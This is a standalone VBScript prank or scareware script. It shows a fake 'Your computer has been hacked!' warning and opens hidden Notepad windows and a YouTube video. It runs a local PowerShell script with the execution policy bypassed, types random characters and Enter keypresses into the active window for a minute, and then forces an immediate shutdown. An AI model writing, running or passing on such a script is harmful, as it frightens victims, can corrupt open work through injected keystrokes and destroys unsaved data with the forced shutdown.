MsgBox "Your computer has been hacked!", vbCritical, "Warning"
Set WshShell = CreateObject("WScript.Shell")

' Open 6 Notepad windows instantly
For i = 1 To 6
    WshShell.Run "notepad", 0, False
    WScript.Sleep 500
Next

' Open YouTube in a hidden browser session
WshShell.Run "cmd /c start chrome --new-window https://www.youtube.com/watch?v=uLghjAKpBMU", 0, False
WScript.Sleep 2000 ' Delay to let video load

' Start glitch effect using PowerShell
WshShell.Run "powershell -ExecutionPolicy Bypass -File glitch.ps1", 0, False

' Typing loop for 60 seconds
startTime = Timer
Do While Timer - startTime < 60
    Randomize
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/`~"
    output = ""

    ' Generate random text
    For i = 1 To 20
        output = output & Mid(chars, Int((Len(chars) * Rnd) + 1), 1)
    Next

    ' Randomly press Enter or Space
    specialKeys = Array("{ENTER}", " ")
    randKey = specialKeys(Int(Rnd * 2))

    ' Send the text
    WshShell.SendKeys output & randKey
    WScript.Sleep 300
Loop

' Shutdown after one minute
WshShell.Run "shutdown -s -t 0"
